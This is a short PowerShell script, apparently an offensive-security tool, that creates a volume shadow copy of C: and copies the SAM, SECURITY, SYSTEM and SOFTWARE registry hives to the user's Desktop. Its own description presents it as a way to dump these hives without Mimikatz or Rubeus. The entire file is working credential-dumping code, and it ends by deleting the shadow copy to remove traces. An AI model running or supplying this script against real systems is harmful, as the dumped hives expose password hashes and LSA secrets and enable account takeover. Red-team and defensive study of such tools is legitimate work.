<#
    Author: vari.sh

    Description: This script let you dump SAM, SECURITY, SYSTEM, SOFTWARE without using Rubeus or Mimikatz.
                  It creates a shadow copy of C: and copies the files on Desktop.
                  Warning: it needs Administrator privileges
    Usage: .\ShadowDumper.ps1
#>

# Get current user
$actualUser = $env:USERNAME
$desktopPath = "C:\Users\$actualUser\Desktop"

Write-Output "[+] Creating shadow copy"
# Create C: shadow copy
wmic shadowcopy call create Volume='C:\' > $null 2>&1

# Get scadow copy ID and Path
$shadowCopyID = (vssadmin list shadows | Select-String -Pattern "Shadow Copy ID:" | Select-Object -Last 1).ToString().Split(': ')[1].Trim()
$shadowCopyPath = (vssadmin list shadows | Select-String -Pattern "Shadow Copy Volume:" | Select-Object -Last 1).ToString().Split(': ')[1].Trim()

Write-Output "[*] ShadowCopy UUID: $shadowCopyID"
Write-Output "[*] ShadowCopy ID: $shadowCopyPath"

# Mount shadow copy on Desktop
$mountPoint = "$desktopPath\backup"
Write-Output "[+] Mounting shadow copy in $mountPoint"
cmd /c "mklink /d $mountPoint $shadowCopyPath"


# Get timestamps
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"

# Copy LSA files on Desktop
Write-Output "[+] Copying SAM..."
copy "$mountPoint\windows\system32\config\sam" "$desktopPath\${timestamp}_sam"
Write-Output "[+] Copying SECURITY..."
copy "$mountPoint\windows\system32\config\security" "$desktopPath\${timestamp}_security"
Write-Output "[+] Copying SYSTEM..."
copy "$mountPoint\windows\system32\config\system" "$desktopPath\${timestamp}_system"
Write-Output "[+] Copying SOFTWARE..."
copy "$mountPoint\windows\system32\config\software" "$desktopPath\${timestamp}_software"

# Deletes mounted folder
Write-Output "[-] Deleting symlink"
rm $mountPoint

# Delete shadow copy
Write-Output "[-] Deleting shadow copy"
vssadmin delete shadows /Shadow="$shadowCopyID" /Quiet > $null 2>&1
